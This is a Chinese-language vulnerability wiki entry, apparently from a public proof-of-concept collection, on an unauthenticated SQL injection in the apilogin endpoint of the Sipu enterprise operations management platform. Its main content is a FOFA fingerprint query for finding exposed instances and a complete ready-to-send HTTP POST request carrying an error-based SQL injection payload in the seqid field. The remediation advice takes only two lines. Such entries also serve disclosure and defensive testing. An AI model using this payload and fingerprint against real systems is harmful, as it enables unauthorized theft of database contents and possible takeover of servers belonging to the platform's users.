---
fofa: "icon_hash="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 思普企业运营管理平台 apilogin SQL注入漏洞

# 漏洞描述

思普企业运营管理平台 apilogin 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

思普企业运营管理平台

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：icon_hash="-403479360"

POC/EXP：

POST /IdsCenter/idsCheck?p=apilogin HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
X-Requested-With: XMLHttpRequest

seqid=1%27+AND+6884+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%286884%3D6884%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--+cxaC&datasource=EOMP1

![image-20241127220236490](./.resource/思普企业运营管理平台apiloginSQL注入漏洞/media/image-20241127220236490.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
